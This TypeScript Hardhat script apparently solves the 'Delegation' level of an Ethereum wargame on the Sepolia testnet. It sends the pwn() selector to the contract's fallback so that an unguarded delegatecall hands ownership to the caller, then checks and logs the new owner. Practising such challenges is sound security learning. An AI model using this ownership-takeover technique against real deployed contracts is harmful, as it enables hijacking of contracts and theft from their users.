import { ethers } from "hardhat";

/**
 * Directly exploit the Delegation contract by calling the fallback method with pwn() signature
 * 
 * Usage: 
 * npx hardhat run scripts/level-06-delegation/execute-delegation-exploit.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-06-delegation/execute-delegation-exploit.ts --network sepolia
 */
async function main() {
  // Get contract address from environment variable or use default
  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Using Delegation contract address: ${contractAddress}`);
  
  // Define a minimal ABI for the Delegation contract - just need the owner function
  const delegationABI = [
    "function owner() view returns (address)"
  ];
  
  // Create a contract instance using the minimal ABI
  const delegationContract = new ethers.Contract(contractAddress, delegationABI, ethers.provider);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check ownership before exploit
    console.log("Checking initial ownership...");
    const initialOwner = await delegationContract.owner();
    console.log(`Current owner: ${initialOwner}`);
    
    // Calculate the function signature for pwn()
    const pwnSignature = ethers.keccak256(ethers.toUtf8Bytes("pwn()")).substring(0, 10);
    console.log(`pwn() function signature: ${pwnSignature}`);
    
    // Call the fallback function by sending a transaction with the pwn() signature as data
    console.log("Executing exploit by calling the fallback function with pwn() signature...");
    const tx = await deployer.sendTransaction({
      to: contractAddress,
      data: pwnSignature,
      gasLimit: 100000 // Set an appropriate gas limit
    });
    
    // Wait for the transaction to be mined
    console.log("Waiting for transaction to be mined...");
    const receipt = await tx.wait();
    
    // Check ownership after exploit
    console.log("Checking ownership after exploit...");
    const newOwner = await delegationContract.owner();
    console.log(`New owner: ${newOwner}`);
    
    // Check if the exploit was successful
    if (newOwner.toLowerCase() === deployer.address.toLowerCase()) {
      console.log("\nExploit successful! You are now the owner.");
    } else {
      console.log("\nExploit failed. You are not the owner.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (receipt) {
      console.log(`\nTransaction details:`);
      console.log(`Hash: ${receipt.hash}`);
      console.log(`Gas used: ${receipt.gasUsed.toString()}`);
      console.log(`Block number: ${receipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
